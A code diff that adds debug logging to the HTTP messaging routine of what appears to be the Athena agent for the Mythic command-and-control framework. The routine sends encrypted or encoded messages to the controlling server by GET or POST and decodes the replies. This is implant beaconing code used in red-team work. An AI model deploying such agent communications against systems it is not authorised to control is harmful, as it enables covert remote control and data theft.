@@ -3,6 +3,7 @@ using Athena.Utilities;
 using System.Text.Json;
 using System.Net;
 using System.Net.Security;
+using System.Diagnostics;
 
 namespace Athena
 {
@@ -108,6 +109,7 @@ namespace Athena
         {
             try
             {
+                Debug.WriteLine($"[{DateTime.Now}] Message to Mythic: {json}");
                 if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
@@ -121,22 +123,28 @@ namespace Athena
 
                 if (json.Length < 2000) //Max URL length
                 {
+                    Debug.WriteLine($"[{DateTime.Now}] Sending as GET");
                     response = await this.client.GetAsync(this.getURL + WebUtility.UrlEncode(json));
                 }
                 else
                 {
+                    Debug.WriteLine($"[{DateTime.Now}] Sending as POST");
                     response = await this.client.PostAsync(this.postURL, new StringContent(json));
                 }
+
+                Debug.WriteLine($"[{DateTime.Now}] Got Response with code: {response.StatusCode}");
 
                 string strRes = await response.Content.ReadAsStringAsync();
 
                 if (this.encrypted)
                 {
+                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {this.crypt.Decrypt(strRes)}");
                     return this.crypt.Decrypt(strRes);
                 }
 
                 if (!string.IsNullOrEmpty(strRes))
                 {
+                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {Misc.Base64Decode(strRes).Result.Substring(36)}");
                     return (await Misc.Base64Decode(strRes)).Substring(36);
                 }
 
